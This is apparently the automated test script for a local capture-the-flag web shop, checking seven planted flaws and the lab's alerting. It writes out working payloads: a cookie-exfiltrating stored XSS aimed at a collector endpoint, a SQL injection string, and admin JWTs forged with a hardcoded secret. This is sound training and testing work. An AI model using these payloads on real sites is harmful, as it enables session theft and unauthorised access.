const http = require('http');
const jwt = require('jsonwebtoken');

const BASE_URL = process.env.API_URL || 'http://localhost:3000';
const JWT_SECRET = '123456';

// Helper for making requests
function request(method, path, body = null, token = null) {
  return new Promise((resolve, reject) => {
    const url = new URL(path, BASE_URL);
    const options = {
      method,
      headers: { 'Content-Type': 'application/json' }
    };
    if (token) options.headers['Authorization'] = `Bearer ${token}`;

    const req = http.request(url, options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          if (res.headers['content-type'] && res.headers['content-type'].includes('application/json')) {
             resolve({ status: res.statusCode, data: JSON.parse(data) });
          } else {
             resolve({ status: res.statusCode, data });
          }
        } catch (e) {
          resolve({ status: res.statusCode, data });
        }
      });
    });

    req.on('error', reject);
    if (body) req.write(JSON.stringify(body));
    req.end();
  });
}

async function runTests() {
  console.log('--- BUGDROP CHALLENGE AUTOMATED TESTS ---');
  let flags = {};
  
  console.log('\nResetting database for clean state...');
  const reset = await request('POST', '/api/sys/reset');
  if (!reset.data || !reset.data.success) {
    console.error('❌ Failed to reset database:', reset.data);
    process.exit(1);
  }
  console.log('✅ Database reset');

  // Create a regular user for tests
  const registerRes = await request('POST', '/api/auth/login', {
    username: 'collector_42',
    password: 'bugdrop2024',
  });
  const userToken = registerRes.data?.token;
  
  if (!userToken) {
    console.error('❌ Failed to login test user:', registerRes.data);
    process.exit(1);
  }
  console.log('✅ Logged in test user');

  // ==========================================
  // CH1: Cart Manipulation
  // ==========================================
    // Check if frontend is running before waiting
    try {
      const http = require('http');
      await new Promise((resolve, reject) => {
        const req = http.get('http://localhost:5173', (res) => { res.on('data', ()=>{}); resolve(); });
        req.on('error', reject);
      });
    } catch(err) {
      console.error('❌ Shop frontend (localhost:5173) no está levantado. El bot no podrá visitarlo.');
      process.exit(1);
    }

  console.log('\nTesting CH1: Cart Manipulation...');
  // Add item to cart
  await request('POST', '/api/cart', { product_id: 12, quantity: 1 }, userToken);
  // Checkout with unit_price: 0
  const ch1 = await request('POST', '/api/cart/checkout', {
    items: [{ product_id: 12, quantity: 1, unit_price: 0 }]
  }, userToken);
  
  if (ch1.data?.flag) {
    flags.cart_manipulation = ch1.data.flag;
    console.log('✅ Got CH1 Flag:', ch1.data.flag);
  } else {
    console.error('❌ CH1 Failed:', ch1.data);
  }

  // ==========================================
  // CH2: Info Disclosure (Backup)
  // ==========================================
  console.log('\nTesting CH2: Info Disclosure...');
  const ch2 = await request('GET', '/backup.bak');
  const flagMatch = typeof ch2.data === 'string' ? ch2.data.match(/FLAG\{[^}]+\}/) : null;
  if (flagMatch) {
    flags.info_disclosure = flagMatch[0];
    console.log('✅ Got CH2 Flag:', flagMatch[0]);
  } else {
    console.error('❌ CH2 Failed:', ch2.data);
  }

  // ==========================================
  // CH3: Stored XSS
  // ==========================================
    console.log('\nTesting CH3: Stored XSS...');
  if (process.env.SKIP_BOT_TEST === '1') {
    console.log('SKIPPED');
  } else {
    // Post the XSS
    await request('POST', '/api/products/1/reviews', {
      content: "<img src=x onerror='fetch(\"http://localhost:3000/api/ctf/collector?c=\"+document.cookie)'>",
      rating: 5
    }, userToken);

    // Wait up to 20s for the SOC alert
    let exfilFlag = null;
    const io = require('socket.io-client');
    const socket = io('http://localhost:3000');
    
    await new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        socket.disconnect();
        reject(new Error('El bot no se ejecutó: ¿npx playwright install chromium?'));
      }, 20000);

      socket.on('http-log', (log) => {
        if (log.threats && log.threats.some(t => t.tag === 'Exfiltration') && log.responseFlag) {
          clearTimeout(timeout);
          exfilFlag = log.responseFlag;
          socket.disconnect();
          resolve();
        }
      });
    });

    if (exfilFlag) {
      flags.stored_xss = exfilFlag;
      console.log('✅ Got CH3 Flag:', exfilFlag);
    } else {
      console.error('❌ CH3 Failed');
    }
  }

  // ==========================================
  // CH4: IDOR
  // ==========================================
  console.log('\nTesting CH4: IDOR...');
  const ch4 = await request('GET', '/api/orders/1', null, userToken);
  if (ch4.data?.flag) {
    flags.idor_orders = ch4.data.flag;
    console.log('✅ Got CH4 Flag:', ch4.data.flag);
  } else {
    console.error('❌ CH4 Failed:', ch4.data);
  }

  // ==========================================
  // CH5: Payment Bypass
  // ==========================================
  console.log('\nTesting CH5: Payment Bypass...');
  // Create a real order to pay for
  await request('POST', '/api/cart', { product_id: 1, quantity: 1 }, userToken);
  const checkout = await request('POST', '/api/cart/checkout', {
    items: [{ product_id: 1, quantity: 1, unit_price: 15 }]
  }, userToken);
  const orderId = checkout.data?.order_id;
  
  if (orderId) {
    const ch5 = await request('POST', `/api/orders/${orderId}/pay`, {
      status: 'success'
    }, userToken);
    
    if (ch5.data?.flag) {
      flags.payment_bypass = ch5.data.flag;
      console.log('✅ Got CH5 Flag:', ch5.data.flag);
    } else {
      console.error('❌ CH5 Failed:', ch5.data);
    }
  } else {
    console.error('❌ CH5 Failed to create order');
  }

  // ==========================================
  // CH6: SQL Injection
  // ==========================================
  console.log('\nTesting CH6: SQL Injection...');
  const ch6 = await request('POST', '/api/newsletter', {
    email: "admin' OR '1'='1"
  });
  if (ch6.data?.flag) {
    flags.sqli_newsletter = ch6.data.flag;
    console.log('✅ Got CH6 Flag:', ch6.data.flag);
  } else {
    console.error('❌ CH6 Failed:', ch6.data);
  }

  // ==========================================
  // CH7: Admin Panel Access
  // ==========================================
  console.log('\nTesting CH7: Admin Panel...');
  const forgedToken = jwt.sign({ id: 1, username: 'admin', role: 'admin' }, JWT_SECRET);
  const ch7 = await request('GET', '/api/admin/dashboard', null, forgedToken);
  if (ch7.data?.flag) {
    flags.admin_panel = ch7.data.flag;
    console.log('✅ Got CH7 Flag:', ch7.data.flag);
  } else {
    console.error('❌ CH7 Failed:', ch7.data);
  }

  // ==========================================
  // VALIDATE ALL FLAGS
  // ==========================================

  // ==========================================
  // ADDITIONAL CHECKS (Step 2)
  // ==========================================
  console.log('\n--- VALIDATING LOGIN ACCOUNTS & ORDER #1 ---');
  try {
    const loginJsx = require('fs').readFileSync('frontend-shop/src/pages/Login.jsx', 'utf8');
    const match = loginJsx.match(/const COLLECTOR_ACCOUNTS = \[[\s\S]*?\];/);
    if (!match) throw new Error('COLLECTOR_ACCOUNTS not found in Login.jsx');
    
    // Quick and dirty parser for the accounts array
    const accounts = [];
    const regex = /username:\s*'([^']+)',\s*password:\s*'([^']+)'/g;
    let m;
    while ((m = regex.exec(match[0])) !== null) {
      accounts.push({ username: m[1], password: m[2] });
    }
    
    if (accounts.length < 4) throw new Error('Not enough accounts parsed');
    for (const acc of accounts) {
      const res = await request('POST', '/api/auth/login', acc);
      if (res.status !== 200) {
        console.error(`❌ Failed to login with ${acc.username}:${acc.password}`);
        process.exit(1);
      }
      console.log(`✅ Login working for ${acc.username}`);
    }

    const order1 = await request('GET', '/api/orders/1', null, userToken); // using the same collector_42 token from setup
    // wait, collector_42 can read order 1 because of IDOR!
    const hasSecretBug = order1.data?.items?.some(i => i.product_name === 'Bug ???');
    if (!hasSecretBug) {
      console.error('❌ Order #1 does not contain Bug ???', order1.data);
      process.exit(1);
    }
    console.log('✅ Order #1 contains Bug ???');
  } catch (err) {
    console.error('❌ Additional checks failed:', err.message);
    process.exit(1);
  }




  console.log('\n--- VALIDATING SESSION PERSISTENCE AFTER RESET ---');
  try {
    const loginRes = await request('POST', '/api/auth/login', { username: 'collector_42', password: 'bugdrop2024' });
    if (!loginRes.data?.token) throw new Error('Could not login');
    const token = loginRes.data.token;
    
    // Reset DB
    await request('POST', '/api/sys/reset');
    
    // Check if token is still valid
    
    const io3 = require('socket.io-client');
    const socket3 = io3('http://localhost:3000');
    let falseAlarm = false;
    let positiveAlarm = false; let meResStatus = 0;
    
    await new Promise(resolve => {
      socket3.on('http-log', (log) => {
        if (log.threats && log.threats.some(t => t.tag === 'Forged JWT')) {
          if (log.url.includes('auth/me')) falseAlarm = true;
          if (log.url.includes('positive-control')) positiveAlarm = true;
        }
      });
      socket3.on('connect', async () => {
        // Legitimate token request
        meResStatus = (await request('GET', '/api/auth/me', null, token)).status;
        if (meResStatus !== 200) console.error('meRes status:', meResStatus);
        
        // Positive control: request with missing jti forged token
        const jwtObj = require('jsonwebtoken').decode(token);
        const badToken = require('jsonwebtoken').sign({ id: jwtObj.id, role: 'admin' }, '123456');
        await request('GET', '/api/orders?positive-control', null, badToken);
        
        setTimeout(() => resolve(), 500);
      });
    });
    
    socket3.disconnect();
    if (falseAlarm) throw new Error('Legitimate token triggered Forged JWT after reset');
    if (!positiveAlarm) throw new Error('Positive control failed: forged token did not trigger Forged JWT in persistence test');

    if (meResStatus !== 200) throw new Error('Token invalidated after reset (status ' + meResStatus + ')');
    
    const jwtObj = require('jsonwebtoken').decode(token);
    const D = require('../backend/node_modules/better-sqlite3');
    const d = new D('backend/bugdrop.db',{readonly:true});
    const row = d.prepare('SELECT * FROM issued_tokens WHERE jti=?').get(jwtObj.jti);
    if (!row) throw new Error('JTI was deleted from database');
    console.log('✅ Session persisted after reset and legitimate token triggered no Forged JWT alert');
  } catch (err) {
    console.error('❌ Session persistence failed:', err.message);
    process.exit(1);
  }

    console.log('\n--- VALIDATING IDOR ALERTS ---');
    const io4 = require('socket.io-client');
    const socket4 = io4('http://localhost:3000');
    let idorFired = false;
    socket4.on('http-log', (log) => {
      if (log.threats && log.threats.some(t => t.tag === 'IDOR')) idorFired = true;
    });

    // Test payment-info no auth -> 401
    const pinfo1 = await request('GET', '/api/orders/1/payment-info');
    if (pinfo1.status !== 401) throw new Error('payment-info without auth should be 401');

    // Test payment-info wrong owner -> 403
    const pinfo2 = await request('GET', '/api/orders/1/payment-info', null, userToken);
    if (pinfo2.status !== 403) throw new Error('payment-info wrong owner should be 403');
    
    // Test orders/:id own owner -> NO IDOR alert
    let idorFired2 = false;
    const socket5 = require('socket.io-client')('http://localhost:3000');
    
    await new Promise(resolve => {
      socket5.on('http-log', (log) => {
        if (log.threats && log.threats.some(t => t.tag === 'IDOR')) idorFired2 = true;
      });
      socket5.on('connect', async () => {
        const ownOrderRes = await request('GET', '/api/orders/2', null, userToken); // 2 is collector_42's order
        setTimeout(() => resolve(), 500);
      });
    });
    
    if (idorFired2) throw new Error('orders/:id own owner should NOT trigger IDOR alert');
    
    // Test orders/:id wrong owner -> 200 + IDOR alert
    idorFired2 = false;
    const otherOrderRes = await request('GET', '/api/orders/1', null, userToken); // 4 is prof_doom's order
    await new Promise(r => setTimeout(r, 500));
    socket5.disconnect();
    if (otherOrderRes.status !== 200) throw new Error('orders/:id wrong owner should be 200');
    if (!idorFired2) throw new Error('orders/:id wrong owner should trigger IDOR alert');
    console.log('✅ IDOR alerts on orders verified (own vs other)');

  console.log('\n--- VALIDATING FORGED JWT ALERT (STEP 5) ---');
  try {
    const loginRes3 = await request('POST', '/api/auth/login', { username: 'collector_42', password: 'bugdrop2024' });
    const userToken = loginRes3.data.token;
    const jwtObj = require('jsonwebtoken').decode(userToken);
    
    // Forge token using user's jti but admin role
    const forgedAdmin = require('jsonwebtoken').sign({
      id: jwtObj.id,
      username: jwtObj.username,
      display_name: jwtObj.display_name,
      role: 'admin',
      jti: jwtObj.jti
    }, '123456');
    
    // Use a quick socket connection to wait for the alert
    const io2 = require('socket.io-client');
    const socket2 = io2('http://localhost:3000');
    let alertFired = false;
    
    await new Promise((resolve) => {
      socket2.on('http-log', (log) => {
        if (log.threats && log.threats.some(t => t.tag === 'Forged JWT')) {
          alertFired = true;
          socket2.disconnect();
          resolve();
        }
      });
      socket2.on('connect', () => {
        request('GET', '/api/admin/dashboard', null, forgedAdmin).then(() => {
          setTimeout(() => {
            if(!alertFired) {
               socket2.disconnect();
               resolve();
            }
          }, 1000);
        });
      });
    });
    
    if (!alertFired) {
      throw new Error('Forged JWT with reused jti did not trigger SOC alert');
    }
    console.log('✅ Forged JWT with reused jti correctly triggers alert');
    // Forge token without jti
    const forgedNoJti = require('jsonwebtoken').sign({
      id: jwtObj.id,
      username: jwtObj.username,
      display_name: jwtObj.display_name,
      role: 'admin'
    }, '123456');

    let alertFiredNoJti = false;
    const socket3 = require('socket.io-client')('http://localhost:3000');
    await new Promise((resolve) => {
      socket3.on('http-log', (log) => {
        if (log.threats && log.threats.some(t => t.tag === 'Forged JWT')) {
          alertFiredNoJti = true;
          socket3.disconnect();
          resolve();
        }
      });
      socket3.on('connect', () => {
        request('GET', '/api/admin/dashboard', null, forgedNoJti).then(() => {
          setTimeout(() => { if(!alertFiredNoJti) { socket3.disconnect(); resolve(); } }, 1000);
        });
      });
    });
    if (!alertFiredNoJti) throw new Error('Forged JWT without jti did not trigger SOC alert');
    console.log('✅ Forged JWT without jti triggers alert');

  } catch (err) {
    console.error('❌ Forged JWT test failed:', err.message);
    process.exit(1);
  }


    // Extract token via XSS simulation like a real student
    let stolenBotToken = null;
    const socketBot = require('socket.io-client')('http://localhost:3000');
    
    await new Promise((resolve, reject) => {
      let done = false;
      const timeout = setTimeout(() => {
        if (!done) reject(new Error('El bot no se ejecutó: ¿npx playwright install chromium?'));
      }, 20000);
      
      socketBot.on('http-log', (log) => {
        if (log.threats && log.threats.some(t => t.tag === 'Exfiltration')) {
          const match = log.url.match(/session=([^&\s]+)/);
          if (match) stolenBotToken = match[1];
          done = true;
          clearTimeout(timeout);
          resolve();
        }
      });
      socketBot.on('connect', () => {
        request('POST', '/api/products/1/reviews', {
          content: "<img src=x onerror='fetch(\"http://localhost:3000/api/ctf/collector?c=\"+document.cookie)'>",
          rating: 5
        }, userToken);
      });
    });
    
    if (!stolenBotToken) throw new Error('Could not extract stolen bot token from SOC log');
    
    let botFalseAlarm = false;
    socketBot.on('http-log', (log) => {
      if (log.threats && log.threats.some(t => t.tag === 'Forged JWT')) botFalseAlarm = true;
    });
    const dashRes = await request('GET', '/api/admin/dashboard', null, stolenBotToken);
    await new Promise(r => setTimeout(r, 500));
    socketBot.disconnect();
    
    if (botFalseAlarm) throw new Error('Legitimate bot token triggered Forged JWT alert');
    if (!dashRes.data?.flag) throw new Error('Bot token did not receive admin flag');
    console.log('✅ Stolen bot token from SOC log works without alert and gets flag');

  console.log('\n--- VALIDATING COLLECTOR NEGATIVE TESTS ---');
  try {
    const neg1 = await request('GET', '/api/ctf/collector?c=admin');
    if (neg1.data?.flag) throw new Error('Collector gave flag for c=admin');
    
    const jwt = require('jsonwebtoken');
    const forged = jwt.sign({ role: 'admin' }, '123456');
    const neg2 = await request('GET', `/api/ctf/collector?c=session=${forged}`);
    if (neg2.data?.flag) throw new Error('Collector gave flag for forged JWT');
    
    const loginRes2 = await request('POST', '/api/auth/login', { username: 'collector_42', password: 'bugdrop2024' });
    const validLoginToken = loginRes2.data.token;
    const neg3 = await request('GET', `/api/ctf/collector?c=session=${validLoginToken}`);
    if (neg3.data?.flag) throw new Error('Collector gave flag for normal user token');
    
    
    
    // Test collector with forged token reusing login jti (should not get flag)
    const jwtObj3 = require('jsonwebtoken').decode(validLoginToken);
    const forgedNeg = require('jsonwebtoken').sign({
      id: jwtObj3.id,
      username: jwtObj3.username,
      display_name: jwtObj3.display_name,
      role: 'admin',
      jti: jwtObj3.jti
    }, '123456');
    const neg4 = await request('GET', `/api/ctf/collector?c=session=${forgedNeg}`);
    if (neg4.data?.flag) throw new Error('Collector gave flag for forged token reusing login JTI');
    
    console.log('✅ Collector negative tests passed');
  } catch (err) {
    console.error('❌ Negative tests failed:', err.message);
    process.exit(1);
  }

  console.log('\n--- VALIDATING SOC MAX_SEVERITY RANKING ---');
  const { computeMaxSeverity } = require('../backend/src/middleware/socInterceptor.js');
  const testThreats = [{ severity: 'high' }, { severity: 'low' }];
  if (computeMaxSeverity(testThreats) !== 'high') {
    console.error('❌ computeMaxSeverity failed: expected high');
    process.exit(1);
  }
  console.log('✅ maxSeverity computes correctly');

  console.log('\n--- VALIDATING FLAGS ---');
  let passed = 0;
  for (const [key, flag] of Object.entries(flags)) {
    
    const val = await request('POST', '/api/ctf/submit', { flag });
    if (val.data?.correct) {
      console.log(`✅ [${key}] Flag accepted by CTF engine`);
      passed++;
    } else {
      console.error(`❌ [${key}] Flag REJECTED:`, val.data);
    }
  }

  console.log(`\nResults: ${passed} / 7 Challenges working end-to-end.`);
  if (passed !== 7) process.exit(1);
}

runTests().catch(console.error);
